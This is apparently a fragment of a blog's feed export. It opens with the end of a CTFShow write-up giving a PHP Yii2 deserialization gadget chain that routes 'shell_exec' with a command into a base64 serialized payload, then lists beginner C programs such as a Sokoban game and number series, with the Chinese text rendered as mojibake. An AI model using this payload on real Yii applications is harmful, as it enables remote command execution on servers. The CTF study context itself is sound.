<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Action</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">IndexAction</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="variable">$func</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="variable">$param</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">web</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">MultiFieldSession</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">writeCallback</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span> <span class="keyword">extends</span> <span class="title">MultiFieldSession</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;writeCallback = [<span class="keyword">new</span> \yii\rest\IndexAction(<span class="variable">$func</span>, <span class="variable">$param</span>), <span class="string">&quot;run&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">base</span>\<span class="title">BaseObject</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> \yii\web\DbSession(<span class="variable">$func</span>, <span class="variable">$param</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">exp</span> = <span class="title">new</span> \<span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>(&#x27;<span class="title">shell_exec</span>&#x27;, &#x27;<span class="title">cp</span> /<span class="title">f</span>* 1.<span class="title">txt</span>&#x27;); <span class="comment">//æ­¤å¤„å†™å‘½ä»¤</span></span><br><span class="line">    <span class="keyword">echo</span>(base64_encode(serialize(<span class="variable">$exp</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web268.png"></p>
<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web268_1.png"></p>
<h2 id="web269"><a href="#web269" class="headerlink" title="web269"></a>web269</h2><p>åŒ web268</p>
<h2 id="web270"><a href="#web270" class="headerlink" title="web270"></a>web270</h2><p>åŒ web268</p>
]]></content>
      <categories>
        <category>CTFç¬”è®°</category>
      </categories>
  </entry>
  <entry>
    <title>OLD</title>
    <url>/2019/08/12/OLD/</url>
    <content><![CDATA[<h1 id="OLD"><a href="#OLD" class="headerlink" title="OLD"></a>OLD</h1><p>ä»¥å¾€æ—§çš„å†…å®¹:ä¸å€¼ä¸€æ</p>
<span id="more"></span>

<h2 id="æ¨ç®±å­å•å…³å¡"><a href="#æ¨ç®±å­å•å…³å¡" class="headerlink" title="æ¨ç®±å­å•å…³å¡"></a>æ¨ç®±å­å•å…³å¡</h2><p>åˆæ¬¡ä½¿ç”¨äºŒç»´æ•°ç»„å¹¶ç¼–å†™ç»å…¸å°æ¸¸æˆï¼šæ¨ç®±å­ï¼ï¼ˆå•å…³å¡ï¼‰</p>
<p>æ³¨ï¼šæŸ¥é˜…è¿‡ç™¾åº¦ï¼Œçƒ¦è¯·å–·å“¥ç•™å¾·ã€‚  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> H 8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> L 8</span></span><br><span class="line"><span class="keyword">int</span> x,y; <span class="comment">// å…¨å±€å˜é‡å­˜å‚¨äººçš„åæ ‡ </span></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">map</span>[H][L]=</span><br><span class="line">&#123;</span><br><span class="line">	&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">	&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">	&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">	&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">1</span>&#125;,</span><br><span class="line">	&#123;<span class="number">1</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">	&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">	&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">	&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>&#125; 	<span class="comment">//0 ç©ºåœ°,1å¢™ï¼Œ2äººï¼Œ3ç®±å­ï¼Œ4ç›®çš„åœ°ï¼Œ7è¾¾åˆ°ç›®çš„åœ°  ä¸€ä¸ªéšè—çš„6ä¹Ÿæ˜¯è¡¨ç¤ºäººï¼Œåªä¸è¿‡è¿™äººç«™åœ¨ç›®çš„åœ°ä¸Šé¢ã€‚ </span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">draw_map</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">x_y</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">		draw_map();</span><br><span class="line">		move();	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¾“å‡ºå›¾å½¢ </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">draw_map</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> i,j;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;H;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;L;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">switch</span>(<span class="built_in">map</span>[i][j])	<span class="comment">// 0=ç©ºåœ°ï¼Œ1=å¢™ï¼Œ2=äººï¼Œ3=ç®±å­ï¼Œ4=ç›®çš„åœ°ï¼› </span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">0</span>:<span class="built_in">printf</span>(<span class="string">&quot;--&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">1</span>:<span class="built_in">printf</span>(<span class="string">&quot;â– &quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">2</span>:<span class="built_in">printf</span>(<span class="string">&quot;â™€&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">3</span>:<span class="built_in">printf</span>(<span class="string">&quot;â—†&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">4</span>:<span class="built_in">printf</span>(<span class="string">&quot;Â¤&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">6</span>:<span class="built_in">printf</span>(<span class="string">&quot;â™‚&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">7</span>:<span class="built_in">printf</span>(<span class="string">&quot;â˜…&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ç§»åŠ¨ </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	x_y();</span><br><span class="line">	boxs_num() ;</span><br><span class="line">	<span class="keyword">char</span> WASD;</span><br><span class="line">	WASD =_getch();</span><br><span class="line">	<span class="keyword">switch</span>(WASD)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// ä¸Š </span></span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;W&#x27;</span>:<span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:<span class="keyword">case</span> <span class="number">72</span>:</span><br><span class="line">			<span class="keyword">if</span>( <span class="built_in">map</span>[x<span class="number">-1</span>][y] == <span class="number">0</span> || <span class="built_in">map</span>[x<span class="number">-1</span>][y] == <span class="number">4</span>)	<span class="comment">// äººçš„å‰é¢ä½ç½®ä¸º ç©ºç™½ æˆ–è€… äººçš„å‰é¢å€¼ç›®çš„åœ° </span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">map</span>[x][y] -=<span class="number">2</span>;</span><br><span class="line">				<span class="built_in">map</span>[x<span class="number">-1</span>][y] +=<span class="number">2</span>;</span><br><span class="line">			&#125;						<span class="comment">//0 ç©ºåœ°,1å¢™ï¼Œ2äººï¼Œ3ç®±å­ï¼Œ4ç›®çš„åœ°ï¼Œ7è¾¾åˆ°ç›®çš„åœ°  ä¸€ä¸ªéšè—çš„6ä¹Ÿæ˜¯è¡¨ç¤ºäººï¼Œåªä¸è¿‡è¿™äººç«™åœ¨ç›®çš„åœ°ä¸Šé¢ã€‚</span></span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>( <span class="built_in">map</span>[x<span class="number">-1</span>][y] == <span class="number">3</span> || <span class="built_in">map</span>[x<span class="number">-1</span>][y] == <span class="number">7</span>) </span><br><span class="line">			&#123;	</span><br><span class="line">				<span class="keyword">if</span>(<span class="built_in">map</span>[x<span class="number">-2</span>][y] == <span class="number">0</span> || <span class="built_in">map</span>[x<span class="number">-2</span>][y] == <span class="number">4</span> )</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">map</span>[x][y] -=<span class="number">2</span>;</span><br><span class="line">					<span class="built_in">map</span>[x<span class="number">-1</span>][y] -=<span class="number">1</span>; <span class="comment">// ç®±å­å˜äºº</span></span><br><span class="line">					<span class="built_in">map</span>[x<span class="number">-2</span>][y] +=<span class="number">3</span>; <span class="comment">// ç®±å­å‰é¢ çš„ç©ºåœ°å˜æˆ ç®±å­  </span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// ä¸‹</span></span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:<span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:<span class="keyword">case</span> <span class="number">80</span>:</span><br><span class="line">			<span class="keyword">if</span>( <span class="built_in">map</span>[x+<span class="number">1</span>][y] == <span class="number">0</span> || <span class="built_in">map</span>[x+<span class="number">1</span>][y] == <span class="number">4</span>)	<span class="comment">// äººçš„å‰é¢ä½ç½®ä¸º ç©ºç™½ æˆ–è€… äººçš„å‰é¢å€¼ç›®çš„åœ° </span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">map</span>[x][y] -=<span class="number">2</span>;</span><br><span class="line">				<span class="built_in">map</span>[x+<span class="number">1</span>][y] +=<span class="number">2</span>;</span><br><span class="line">			&#125;						<span class="comment">//0 ç©ºåœ°,1å¢™ï¼Œ2äººï¼Œ3ç®±å­ï¼Œ4ç›®çš„åœ°ï¼Œ7è¾¾åˆ°ç›®çš„åœ°  ä¸€ä¸ªéšè—çš„6ä¹Ÿæ˜¯è¡¨ç¤ºäººï¼Œåªä¸è¿‡è¿™äººç«™åœ¨ç›®çš„åœ°ä¸Šé¢ã€‚</span></span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>( <span class="built_in">map</span>[x+<span class="number">1</span>][y] == <span class="number">3</span> || <span class="built_in">map</span>[x+<span class="number">1</span>][y] == <span class="number">7</span>) </span><br><span class="line">			&#123;	</span><br><span class="line">				<span class="keyword">if</span>(<span class="built_in">map</span>[x+<span class="number">2</span>][y] == <span class="number">0</span> || <span class="built_in">map</span>[x+<span class="number">2</span>][y] == <span class="number">4</span> )</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">map</span>[x][y] -=<span class="number">2</span>;</span><br><span class="line">					<span class="built_in">map</span>[x+<span class="number">1</span>][y] -=<span class="number">1</span>; <span class="comment">// ç®±å­å˜äºº</span></span><br><span class="line">					<span class="built_in">map</span>[x+<span class="number">2</span>][y] +=<span class="number">3</span>; <span class="comment">// ç®±å­å‰é¢ çš„ç©ºåœ°å˜æˆ ç®±å­  </span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">		<span class="comment">// å·¦</span></span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>:<span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:<span class="keyword">case</span> <span class="number">75</span>:</span><br><span class="line">			<span class="keyword">if</span>( <span class="built_in">map</span>[x][y<span class="number">-1</span>] == <span class="number">0</span> || <span class="built_in">map</span>[x][y<span class="number">-1</span>] == <span class="number">4</span>)	<span class="comment">// äººçš„å‰é¢ä½ç½®ä¸º ç©ºç™½ æˆ–è€… äººçš„å‰é¢å€¼ç›®çš„åœ° </span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">map</span>[x][y] -=<span class="number">2</span>;</span><br><span class="line">				<span class="built_in">map</span>[x][y<span class="number">-1</span>] +=<span class="number">2</span>;</span><br><span class="line">			&#125;						<span class="comment">//0 ç©ºåœ°,1å¢™ï¼Œ2äººï¼Œ3ç®±å­ï¼Œ4ç›®çš„åœ°ï¼Œ7è¾¾åˆ°ç›®çš„åœ°  ä¸€ä¸ªéšè—çš„6ä¹Ÿæ˜¯è¡¨ç¤ºäººï¼Œåªä¸è¿‡è¿™äººç«™åœ¨ç›®çš„åœ°ä¸Šé¢ã€‚</span></span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>( <span class="built_in">map</span>[x][y<span class="number">-1</span>] == <span class="number">3</span> || <span class="built_in">map</span>[x][y<span class="number">-1</span>] == <span class="number">7</span>) </span><br><span class="line">			&#123;	</span><br><span class="line">				<span class="keyword">if</span>(<span class="built_in">map</span>[x][y<span class="number">-2</span>] == <span class="number">0</span> || <span class="built_in">map</span>[x][y<span class="number">-2</span>] == <span class="number">4</span> )</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">map</span>[x][y] -=<span class="number">2</span>;</span><br><span class="line">					<span class="built_in">map</span>[x][y<span class="number">-1</span>] -=<span class="number">1</span>; <span class="comment">// ç®±å­å˜äºº</span></span><br><span class="line">					<span class="built_in">map</span>[x][y<span class="number">-2</span>] +=<span class="number">3</span>; <span class="comment">// ç®±å­å‰é¢ çš„ç©ºåœ°å˜æˆ ç®±å­  </span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">		<span class="comment">// å³</span></span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>:<span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:<span class="keyword">case</span> <span class="number">77</span>:</span><br><span class="line">			<span class="keyword">if</span>( <span class="built_in">map</span>[x][y+<span class="number">1</span>] == <span class="number">0</span> || <span class="built_in">map</span>[x][y+<span class="number">1</span>] == <span class="number">4</span>)	<span class="comment">// äººçš„å‰é¢ä½ç½®ä¸º ç©ºç™½ æˆ–è€… äººçš„å‰é¢å€¼ç›®çš„åœ° </span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">map</span>[x][y] -=<span class="number">2</span>;</span><br><span class="line">				<span class="built_in">map</span>[x][y+<span class="number">1</span>] +=<span class="number">2</span>;</span><br><span class="line">			&#125;						<span class="comment">//0 ç©ºåœ°,1å¢™ï¼Œ2äººï¼Œ3ç®±å­ï¼Œ4ç›®çš„åœ°ï¼Œ7è¾¾åˆ°ç›®çš„åœ°  ä¸€ä¸ªéšè—çš„6ä¹Ÿæ˜¯è¡¨ç¤ºäººï¼Œåªä¸è¿‡è¿™äººç«™åœ¨ç›®çš„åœ°ä¸Šé¢ã€‚</span></span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>( <span class="built_in">map</span>[x][y+<span class="number">1</span>] == <span class="number">3</span> || <span class="built_in">map</span>[x][y+<span class="number">1</span>] == <span class="number">7</span>) </span><br><span class="line">			&#123;	</span><br><span class="line">				<span class="keyword">if</span>(<span class="built_in">map</span>[x][y+<span class="number">2</span>] == <span class="number">0</span> || <span class="built_in">map</span>[x][y+<span class="number">2</span>] == <span class="number">4</span> )</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">map</span>[x][y] -=<span class="number">2</span>;</span><br><span class="line">					<span class="built_in">map</span>[x][y+<span class="number">1</span>] -=<span class="number">1</span>; <span class="comment">// ç®±å­å˜äºº</span></span><br><span class="line">					<span class="built_in">map</span>[x][y+<span class="number">2</span>] +=<span class="number">3</span>; <span class="comment">// ç®±å­å‰é¢ çš„ç©ºåœ°å˜æˆ ç®±å­  </span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">		 </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è·å–äººçš„åæ ‡</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">x_y</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;H;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;L;j++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>(<span class="built_in">map</span>[i][j] == <span class="number">2</span>||<span class="built_in">map</span>[i][j] == <span class="number">6</span>)</span><br><span class="line">					&#123;x=i;y=j;&#125;</span><br><span class="line">			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;äººçš„åæ ‡(%d,%d)\n&quot;</span>,x,y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è‡ªåŠ¨æ±‚å¾—ç®±å­ä¸ªæ•°</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">boxs_num</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j,boxs=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;H;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;L;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">map</span>[i][j] == <span class="number">3</span>)</span><br><span class="line">				boxs++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>( boxs == <span class="number">0</span> )</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;æ¸¸æˆç»“æŸ!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/tuixiangzi.gif"></p>
<h2 id="1Â²-2Â²-3Â²-â€¦â€¦10Â²"><a href="#1Â²-2Â²-3Â²-â€¦â€¦10Â²" class="headerlink" title="1Â²+2Â²+3Â²+â€¦â€¦10Â²"></a>1Â²+2Â²+3Â²+â€¦â€¦10Â²</h2><p>è®¡ç®—1Â²+2Â²+3Â²+â€¦â€¦10Â²ï¼š  </p>
<p>æºä»£ç ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j,sum=<span class="number">0</span>,temp;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">10</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			temp=i*i;</span><br><span class="line">			sum+=temp;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;sum=%d\n&quot;</span>,sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/011.jpg"></p>
<h2 id="1-2-2-3-3-4-4-5-5"><a href="#1-2-2-3-3-4-4-5-5" class="headerlink" title="1+2^2+3^3+4^4+5^5"></a>1+2^2+3^3+4^4+5^5</h2><p>è®¡ç®—ï¼š1+2^2+3^3+4^4+5^5ï¼š  </p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 5</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j,temp,sum=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			temp=<span class="number">1</span>;</span><br><span class="line">			<span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=i;j++)</span><br><span class="line">				temp*=i;</span><br><span class="line">			sum+=temp;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1+2^2+3^3+4^4+5^5=&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot; %d\n&quot;</span>,sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/123.jpg"></p>
<h2 id="1-3-3-9-2-7-1-4-4-1-6"><a href="#1-3-3-9-2-7-1-4-4-1-6" class="headerlink" title="1 3 3 9 2 7 1 4 4 1 6"></a>1 3 3 9 2 7 1 4 4 1 6</h2><p>è¾“å‡ºæ•°åˆ—ï¼š 1 3 3 9 2 7 1 4 4 1 6â€¦â€¦ å‰20é¡¹ã€‚  </p>
<p>æºä»£ç ï¼š </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 20</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[N],i,j,t=<span class="number">0</span>;</span><br><span class="line">	a[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">	a[<span class="number">1</span>]=<span class="number">3</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			a[i]=a[i<span class="number">-1</span>]*a[i<span class="number">-2</span>];</span><br><span class="line">			t=a[i];</span><br><span class="line">			<span class="keyword">if</span>(t&gt;=<span class="number">10</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					j=t;</span><br><span class="line">					a[i]=t/=<span class="number">10</span>;</span><br><span class="line">					a[++i]=j%=<span class="number">10</span>; </span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š</p>
<p><img src="/2019/08/12/OLD/133927.jpg"></p>
<h2 id="æ±‚2-22-222â€¦â€¦å‰7é¡¹å’Œ"><a href="#æ±‚2-22-222â€¦â€¦å‰7é¡¹å’Œ" class="headerlink" title="æ±‚2+22+222â€¦â€¦å‰7é¡¹å’Œ"></a>æ±‚2+22+222â€¦â€¦å‰7é¡¹å’Œ</h2><p>è®¡ç®— 2+22+222+2222+22222+222222+2222222 </p>
<p>æºä»£ç ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 7</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a,b,i,temp=<span class="number">10</span>,sum=<span class="number">0</span>;</span><br><span class="line">	a=b=<span class="number">2</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d+&quot;</span>,a)	;</span><br><span class="line">			sum+=a;</span><br><span class="line">			a=b*temp+a;</span><br><span class="line">			temp*=<span class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\b=%d\n&quot;</span>,sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š</p>
<p><img src="/2019/08/12/OLD/2+22+222.jpg"></p>
<h2 id="21ä¸–çºªçš„é—°å¹´å’Œå¹³å¹´"><a href="#21ä¸–çºªçš„é—°å¹´å’Œå¹³å¹´" class="headerlink" title="21ä¸–çºªçš„é—°å¹´å’Œå¹³å¹´"></a>21ä¸–çºªçš„é—°å¹´å’Œå¹³å¹´</h2><p>æºä»£ç ï¼š </p>
